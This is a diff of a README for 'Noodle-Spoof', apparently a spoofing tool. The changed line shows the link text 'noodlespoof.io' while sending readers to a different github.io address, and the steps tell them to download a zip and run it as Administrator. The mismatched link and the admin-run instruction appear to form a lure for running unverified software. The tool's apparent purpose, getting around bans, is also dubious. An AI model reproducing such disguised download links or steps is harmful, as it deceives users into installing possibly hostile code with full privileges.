@@ -31,7 +31,7 @@ Because you want **results**, not excuses.
 
 ## 🧰 **How to Use Noodle-Spoof**  
 
-1. **📥 Download** the latest version from: **[https://noodlespoof.io](https://noodlespoof.io)**  
+1. **📥 Download** the latest version from: **[https://noodlespoof.io](https://dripnoodle.github.io/Noodle-Spoof/)**  
 2. **🗂 Extract** the `.zip` file using **7-Zip** or **WinRAR**  
 3. **🔓 Right-click > Run as Administrator**  
 4. **🌀 Click “Spoof Now”** and wait for the magic  
